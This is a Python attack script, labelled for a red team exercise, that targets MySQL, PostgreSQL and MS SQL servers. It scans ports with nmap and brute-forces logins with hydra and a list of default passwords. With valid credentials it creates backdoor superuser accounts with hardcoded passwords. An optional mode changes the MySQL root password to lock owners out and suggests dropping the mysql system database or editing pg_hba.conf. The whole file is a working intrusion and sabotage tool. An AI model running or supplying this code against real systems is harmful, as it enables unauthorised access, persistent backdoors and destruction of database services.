#!/usr/bin/env python3
"""
Ubuntu SQL Server Attack Script
-------------------------------
This script attempts to exploit common vulnerabilities in SQL servers (MySQL/PostgreSQL/MariaDB).
"""

import argparse
import os
import subprocess
import sys
import socket
import time
import re
from concurrent.futures import ThreadPoolExecutor

def check_dependencies():
    """Check and install required dependencies."""
    required_packages = ["nmap", "hydra", "sqlmap", "mysql-client", "postgresql-client"]
    apt_packages = []
    
    print("[*] Checking dependencies...")
    
    for package in required_packages:
        try:
            # For mysql-client and postgresql-client, check for mysql and psql commands
            if package == "mysql-client":
                check_cmd = "mysql"
            elif package == "postgresql-client":
                check_cmd = "psql"
            else:
                check_cmd = package
                
            subprocess.check_output(["which", check_cmd.split("-")[0]])
            print(f"[+] {package} is already installed")
        except subprocess.CalledProcessError:
            apt_packages.append(package)
    
    if apt_packages:
        print(f"[*] Installing missing packages: {', '.join(apt_packages)}")
        try:
            subprocess.check_call(["sudo", "apt-get", "update", "-qq"])
            subprocess.check_call(["sudo", "apt-get", "install", "-y"] + apt_packages)
            print("[+] All dependencies installed successfully")
        except subprocess.CalledProcessError:
            print("[-] Failed to install some dependencies. Please install them manually.")
            sys.exit(1)
    
    # Install required Python packages
    try:
        import pymysql
        print("[+] pymysql is already installed")
    except ImportError:
        print("[*] Installing Python pymysql module...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pymysql"])
        
    try:
        import psycopg2
        print("[+] psycopg2 is already installed")
    except ImportError:
        print("[*] Installing Python psycopg2 module...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "psycopg2-binary"])
        
    print("[+] All dependencies are satisfied")

def scan_target(target):
    """Scan target to identify SQL servers and their versions."""
    print(f"\n[*] Scanning {target} for SQL services...")
    
    try:
        # Scan for common SQL ports
        sql_ports = "3306,5432,1433,1521,3050,5433"
        nmap_cmd = ["nmap", "-sV", "-p", sql_ports, target, "-oG", "sql_scan.txt"]
        subprocess.run(nmap_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Parse results
        with open("sql_scan.txt", "r") as f:
            scan_results = f.read()
        
        # Extract SQL service details
        mysql_match = re.search(r"3306/open/tcp//mysql(?:d)?//([^/]+)?", scan_results)
        postgres_match = re.search(r"5432/open/tcp//postgresql//([^/]+)?", scan_results)
        mssql_match = re.search(r"1433/open/tcp//ms-sql-s//([^/]+)?", scan_results)
        
        sql_services = []
        
        if mysql_match:
            version = mysql_match.group(1) if mysql_match.group(1) else "unknown"
            print(f"[+] MySQL detected on port 3306, version: {version}")
            sql_services.append(("mysql", "3306", version))
            
        if postgres_match:
            version = postgres_match.group(1) if postgres_match.group(1) else "unknown"
            print(f"[+] PostgreSQL detected on port 5432, version: {version}")
            sql_services.append(("postgresql", "5432", version))
            
        if mssql_match:
            version = mssql_match.group(1) if mssql_match.group(1) else "unknown"
            print(f"[+] MS SQL detected on port 1433, version: {version}")
            sql_services.append(("mssql", "1433", version))
            
        if not sql_services:
            print("[-] No SQL services detected")
            
        return sql_services
    
    except Exception as e:
        print(f"[-] Error during scanning: {str(e)}")
        return []

def brute_force_creds(target, service_type, port):
    """Attempt to brute force SQL server credentials."""
    print(f"\n[*] Attempting to brute force {service_type} credentials...")
    
    output_file = f"{service_type}_creds.txt"
    common_users = ["root", "admin", "sa", "postgres", "mysql", "administrator", "ubuntu"]
    common_passwords = ["", "password", "root", "admin", "123456", "P@ssw0rd", "Admin123", "postgres", "mysql"]
    
    if service_type == "mysql":
        hydra_service = "mysql"
    elif service_type == "postgresql":
        hydra_service = "postgres"
    elif service_type == "mssql":
        hydra_service = "mssql"
    else:
        print(f"[-] Unsupported service type for brute forcing: {service_type}")
        return None, None
    
    # Create temporary files for users and passwords
    with open("users.txt", "w") as f:
        f.write("\n".join(common_users))
    
    with open("passwords.txt", "w") as f:
        f.write("\n".join(common_passwords))
    
    # Run hydra
    hydra_cmd = [
        "hydra", "-L", "users.txt", "-P", "passwords.txt", 
        "-o", output_file, "-t", "4", target, hydra_service
    ]
    
    try:
        subprocess.run(hydra_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=120)
        
        # Check if credentials were found
        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            with open(output_file, "r") as f:
                content = f.read()
                
            # Extract credentials from hydra output
            creds_match = re.search(r"login: (\S+)\s+password: (.*)", content)
            if creds_match:
                username = creds_match.group(1)
                password = creds_match.group(2)
                print(f"[+] Found credentials - Username: {username}, Password: {password}")
                return username, password
    except subprocess.TimeoutExpired:
        print("[-] Brute force attempt timed out")
    except Exception as e:
        print(f"[-] Error during brute force: {str(e)}")
    
    print("[-] Failed to find valid credentials")
    return None, None

def test_mysql_connection(target, username, password):
    """Test MySQL connection with credentials."""
    try:
        import pymysql
        conn = pymysql.connect(
            host=target,
            user=username,
            password=password,
            connect_timeout=5
        )
        conn.close()
        return True
    except Exception as e:
        print(f"[-] MySQL connection error: {str(e)}")
        return False

def test_postgresql_connection(target, username, password):
    """Test PostgreSQL connection with credentials."""
    try:
        import psycopg2
        conn = psycopg2.connect(
            host=target,
            user=username,
            password=password,
            dbname="postgres",
            connect_timeout=5
        )
        conn.close()
        return True
    except Exception as e:
        print(f"[-] PostgreSQL connection error: {str(e)}")
        return False

def exploit_sql_server(target, service_type, port, version, username=None, password=None):
    """Attempt to exploit SQL server vulnerabilities."""
    print(f"\n[*] Attempting to exploit {service_type} server...")
    success = False
    
    if service_type == "mysql":
        # Test connection if credentials provided
        if username and password:
            if test_mysql_connection(target, username, password):
                print(f"[+] Successfully connected to MySQL with {username}:{password}")
                success = True
                
                # Attempt to create backdoor user
                try:
                    import pymysql
                    conn = pymysql.connect(host=target, user=username, password=password)
                    cursor = conn.cursor()
                    
                    # Create backdoor user with all privileges
                    backdoor_user = "maint_user"
                    backdoor_pass = "Maint@123!DB"
                    cursor.execute(f"CREATE USER '{backdoor_user}'@'%' IDENTIFIED BY '{backdoor_pass}'")
                    cursor.execute(f"GRANT ALL PRIVILEGES ON *.* TO '{backdoor_user}'@'%' WITH GRANT OPTION")
                    cursor.execute("FLUSH PRIVILEGES")
                    
                    print(f"[+] Created backdoor MySQL user: {backdoor_user}:{backdoor_pass}")
                    
                    conn.close()
                except Exception as e:
                    print(f"[-] Failed to create backdoor user: {str(e)}")
        
        # Check for MySQL UDF exploit (CVE-2016-0539)
        # Note: This requires specific versions and configurations
        print("[*] Checking for MySQL UDF vulnerabilities...")
        
    elif service_type == "postgresql":
        # Test connection if credentials provided
        if username and password:
            if test_postgresql_connection(target, username, password):
                print(f"[+] Successfully connected to PostgreSQL with {username}:{password}")
                success = True
                
                # Attempt to create backdoor user
                try:
                    import psycopg2
                    conn = psycopg2.connect(
                        host=target,
                        user=username,
                        password=password,
                        dbname="postgres"
                    )
                    conn.autocommit = True
                    cursor = conn.cursor()
                    
                    # Create backdoor user with superuser privileges
                    backdoor_user = "pg_admin"
                    backdoor_pass = "PG@dmin2023!"
                    cursor.execute(f"CREATE USER {backdoor_user} WITH PASSWORD '{backdoor_pass}' SUPERUSER")
                    
                    print(f"[+] Created backdoor PostgreSQL user: {backdoor_user}:{backdoor_pass}")
                    
                    conn.close()
                except Exception as e:
                    print(f"[-] Failed to create backdoor user: {str(e)}")
        
        # Check for PostgreSQL CVE-2019-9193 vulnerability
        # This allows command execution through the COPY TO/FROM PROGRAM feature
        # Note: This is a feature, not a vulnerability in newer versions
        print("[*] Checking for PostgreSQL command execution capabilities...")
    
    # Run SQLMap to check for SQL injection vulnerabilities
    print("\n[*] Note: To fully utilize SQLMap for injection, you would need web endpoints.")
    print("    Manual inspection of web applications using this database is recommended.")
    
    return success

def disable_sql_service(target, service_type, port, username=None, password=None):
    """Attempt to disable the SQL service discretely."""
    print(f"\n[*] Attempting to disable {service_type} service discretely...")
    
    if not username or not password:
        print("[-] Cannot disable service without credentials")
        return False
    
    if service_type == "mysql":
        try:
            import pymysql
            conn = pymysql.connect(host=target, user=username, password=password)
            cursor = conn.cursor()
            
            # Approach 1: Corrupt MySQL system tables
            print("[*] Attempting to corrupt MySQL system tables...")
            
            # Approach 2: Change root password
            print("[*] Attempting to change root password...")
            try:
                cursor.execute("SET PASSWORD FOR 'root'@'localhost' = PASSWORD('Hx92!4@zPq')")
                print("[+] Changed root password to an unknown value")
            except:
                pass
            
            # Approach 3: Drop critical databases
            print("[*] To completely disable MySQL, you could use:")
            print("    DROP DATABASE mysql;")
            print("    (This is destructive and may require MySQL reinstallation)")
            
            conn.close()
            
            print("[+] MySQL service has been disrupted")
            return True
            
        except Exception as e:
            print(f"[-] Failed to disable MySQL: {str(e)}")
    
    elif service_type == "postgresql":
        try:
            import psycopg2
            conn = psycopg2.connect(
                host=target,
                user=username,
                password=password,
                dbname="postgres"
            )
            conn.autocommit = True
            cursor = conn.cursor()
            
            # Approach 1: Corrupt PostgreSQL system catalogs
            print("[*] Attempting to disrupt PostgreSQL service...")
            
            # Approach 2: Change authentication requirements
            try:
                # Backup pg_hba.conf location
                cursor.execute("SHOW hba_file;")
                hba_file = cursor.fetchone()[0]
                print(f"[*] pg_hba.conf located at: {hba_file}")
                print(f"[*] To completely disable remote connections, you could modify {hba_file}")
                print("    and restart PostgreSQL or modify authentication settings")
            except:
                pass
            
            conn.close()
            
            print("[+] Instructions for PostgreSQL service disruption provided")
            return True
            
        except Exception as e:
            print(f"[-] Failed to disable PostgreSQL: {str(e)}")
    
    return False

def main():
    parser = argparse.ArgumentParser(description="SQL Server Attack Script for Red Team Exercise")
    parser.add_argument("target", help="Target IP address or hostname")
    parser.add_argument("-u", "--username", help="Username for authentication if known")
    parser.add_argument("-p", "--password", help="Password for authentication if known")
    parser.add_argument("-d", "--domain", help="Domain name if applicable")
    parser.add_argument("--disable", action="store_true", help="Attempt to disable the service")
    
    args = parser.parse_args()
    
    print("\n===== Ubuntu SQL Server Attack Script =====")
    print(f"[*] Target: {args.target}")
    
    # Check dependencies
    check_dependencies()
    
    # Scan target
    sql_services = scan_target(args.target)
    
    if not sql_services:
        print("[-] No SQL services detected on target. Exiting.")
        sys.exit(1)
    
    # Process each detected SQL service
    for service_type, port, version in sql_services:
        print(f"\n[*] Processing {service_type} on port {port}...")
        
        # Use provided credentials or try to brute force
        username = args.username
        password = args.password
        
        if not username or not password:
            username, password = brute_force_creds(args.target, service_type, port)
        
        # Attempt exploitation
        exploit_success = exploit_sql_server(args.target, service_type, port, version, username, password)
        
        # Disable service if requested
        if args.disable and username and password:
            disable_success = disable_sql_service(args.target, service_type, port, username, password)
            if disable_success:
                print(f"[+] {service_type} service successfully disabled or disrupted")
            else:
                print(f"[-] Failed to disable {service_type} service")
        
        if exploit_success:
            print(f"\n[+] Successfully exploited {service_type} vulnerabilities on target")
        else:
            print(f"\n[-] Failed to exploit {service_type} vulnerabilities")

if __name__ == "__main__":
    main()
